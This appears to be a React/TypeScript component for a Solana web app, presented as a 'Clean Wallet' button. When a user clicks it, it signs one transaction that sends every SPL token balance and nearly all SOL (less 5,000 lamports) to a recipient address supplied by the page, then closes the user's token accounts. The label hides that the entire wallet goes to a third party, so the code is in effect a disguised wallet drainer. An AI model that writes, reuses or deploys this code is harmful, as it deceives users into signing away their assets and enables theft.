// components/CleaningWallet.tsx

import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
    PublicKey,
    TransactionMessage,
    VersionedTransaction,
    SystemProgram,
} from '@solana/web3.js';
import {
    TOKEN_PROGRAM_ID,
    createTransferInstruction,
    createCloseAccountInstruction,
    getAssociatedTokenAddress,
    createAssociatedTokenAccountInstruction,
} from '@solana/spl-token';
import { FC, useCallback } from 'react';
import { notify } from '../utils/notifications';

interface CleaningWalletProps {
    recipient: string;
}

export const CleaningWallet: FC<CleaningWalletProps> = ({ recipient }) => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();

    const onClick = useCallback(async () => {
        if (!publicKey) {
            notify({ type: 'error', message: 'Wallet not connected!' });
            return;
        }

        let recipientPublicKey: PublicKey;
        try {
            recipientPublicKey = new PublicKey(recipient);
        } catch {
            notify({ type: 'error', message: 'Invalid recipient wallet address!' });
            return;
        }

        let signature = '';

        try {
            const accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: TOKEN_PROGRAM_ID,
            });

            const instructions = [];

            for (const account of accounts.value) {
                const data = account.account.data.parsed.info;
                const mint = new PublicKey(data.mint);
                const amount = data.tokenAmount.amount;

                // 받는 사람의 ATA 주소 확인
                const recipientATA = await getAssociatedTokenAddress(mint, recipientPublicKey);

                // 받는 사람의 ATA가 존재하는지 확인
                const recipientATAInfo = await connection.getAccountInfo(recipientATA);

                // 받는 사람의 ATA가 없으면 생성
                if (!recipientATAInfo) {
                    instructions.push(
                        createAssociatedTokenAccountInstruction(
                            publicKey,
                            recipientATA,
                            recipientPublicKey,
                            mint
                        )
                    );
                }

                // 잔액이 있으면 토큰 전송
                if (amount !== '0') {
                    instructions.push(
                        createTransferInstruction(
                            account.pubkey,
                            recipientATA,
                            publicKey,
                            BigInt(amount)
                        )
                    );
                }

                // 계정 닫기
                instructions.push(
                    createCloseAccountInstruction(account.pubkey, publicKey, publicKey)
                );
            }

            // SOL 잔액 가져오기
            const balance = await connection.getBalance(publicKey);
            const lamportsToSend = balance - 5000; // 수수료로 5000 lamports 남김

            if (lamportsToSend > 0) {
                instructions.push(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: recipientPublicKey,
                        lamports: lamportsToSend,
                    })
                );
            }

            if (instructions.length === 0) {
                notify({ type: 'info', message: 'No eligible accounts to process.' });
                return;
            }

            const latestBlockhash = await connection.getLatestBlockhash();

            const message = new TransactionMessage({
                payerKey: publicKey,
                recentBlockhash: latestBlockhash.blockhash,
                instructions,
            }).compileToLegacyMessage();

            const transaction = new VersionedTransaction(message);
            signature = await sendTransaction(transaction, connection);

            await connection.confirmTransaction({ signature, ...latestBlockhash }, 'confirmed');

            notify({ type: 'success', message: 'Transaction successful!', txid: signature });
        } catch (error: any) {
            console.error('Transaction Error:', error);
            notify({ type: 'error', message: 'Transaction failed!', description: error?.message, txid: signature });
        }
    }, [publicKey, connection, sendTransaction, recipient]);

    return (
        <div className="flex flex-row justify-center">
            <button
                className="group w-60 m-2 btn animate-pulse bg-gradient-to-br from-indigo-500 to-fuchsia-500 hover:from-white hover:to-purple-300 text-black"
                onClick={onClick}
                disabled={!publicKey}
            >
                <div className="hidden group-disabled:block">Wallet not connected</div>
                <span className="block group-disabled:hidden">Clean Wallet</span>
            </button>
        </div>
    );
};
